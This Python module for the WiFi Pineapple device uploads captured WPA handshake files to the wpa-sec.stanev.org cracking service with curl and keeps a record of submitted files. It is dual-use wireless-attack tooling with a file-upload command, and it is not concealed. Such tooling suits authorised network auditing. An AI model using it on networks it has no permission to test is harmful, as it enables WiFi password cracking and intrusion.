#!/usr/bin/env python3
import logging
import os
import json
import time
import subprocess
from pineapple.modules import Module, Request
from pineapple.helpers.network_helpers import check_for_internet
from pineapple.helpers.command_helpers import grep_output


module = Module('wpasec', logging.DEBUG)
API_KEY = None
STATUS_REPORT = None

_MODULE_PATH = '/pineapple/ui/modules/wpasec'
_ASSETS_PATH = f'{_MODULE_PATH}/assets'


def get_api_key_from_file():
    """Set the API key from the API_KEY file"""
    global API_KEY
    try:
        with open(os.path.join(_ASSETS_PATH, 'API_KEY')) as f:
            API_KEY = f.read().strip()
    except FileNotFoundError:
        return None

def get_report():
    """Get json report file that contains submitted handshake paths. If it doesnt exist, create it"""
    global STATUS_REPORT
    try:
        with open(os.path.join(_ASSETS_PATH, 'report.json')) as f:
            STATUS_REPORT = json.load(f)
    except Exception:
        STATUS_REPORT = {"reported": []}
        with open(os.path.join(_ASSETS_PATH, 'report.json'), 'w') as f:
            json.dump(STATUS_REPORT, f)

def submit_handshake(path: str) -> bool:
    """Submit handshake to https://wpa-sec.stanev.org with API_KEY as cookie"""
    try:
        # Run command 'curl -X POST -F "webfile=xxx" --cookie "key=${wpasec_key}" https://wpa-sec.stanev.org/\?submit;'
        cmd = f'curl -X POST -F webfile=@{path} --cookie key={API_KEY} https://wpa-sec.stanev.org/?submit'
        result = subprocess.check_output(cmd.split(' '), encoding='UTF-8')
        module.logger.debug("Result of submitting handshake: %s", result)
        return True
    except Exception as e:
        module.logger.error('Error submitting handshake: %s', e)
        return False

def add_handshake_to_report(path):
    """Add handshake to report so we dont submit it twice"""
    get_report()
    if path not in STATUS_REPORT["reported"]:
        STATUS_REPORT["reported"].append(path)
        with open(os.path.join(_ASSETS_PATH, 'report.json'), 'w') as f:
            json.dump(STATUS_REPORT, f)

@module.handles_action('submit_handshakes')
def submit_handshakes(request: Request):
    """Submit all handshakes to https://wpa-sec.stanev.org with API_KEY as cookie"""
    if not check_for_internet():
        return {'status': 'error', 'message': 'No internet connection'}
    if not API_KEY:
        return {'status': 'error', 'message': 'No API key set'}
    get_report()
    handshake_paths = [handshake['location'] for handshake in request.handshakes]
    if not handshake_paths:
        return {'status': 'error', 'message': 'No handshakes found'}
    for path in handshake_paths:
        if path not in STATUS_REPORT["reported"]:
            if submit_handshake(path):
                add_handshake_to_report(path)
    return {'status': 'success', 'message': 'Submitted all handshakes'}

@module.handles_action('save_api_key')
def save_api_key(request: Request):
    """Save the API key to the API_KEY file"""
    global API_KEY
    API_KEY = request.api_key
    with open(os.path.join(_ASSETS_PATH, 'API_KEY'), 'w') as f:
        f.write(API_KEY)
    return {'success': True}

@module.handles_action('get_api_key')
def get_api_key(request: Request):
    """Get the API key"""
    get_api_key_from_file()
    return {'api_key': API_KEY}

@module.on_start()
def on_start():
    """Get the API key on start"""
    get_api_key_from_file()
    get_report()


if __name__ == '__main__':
    module.start()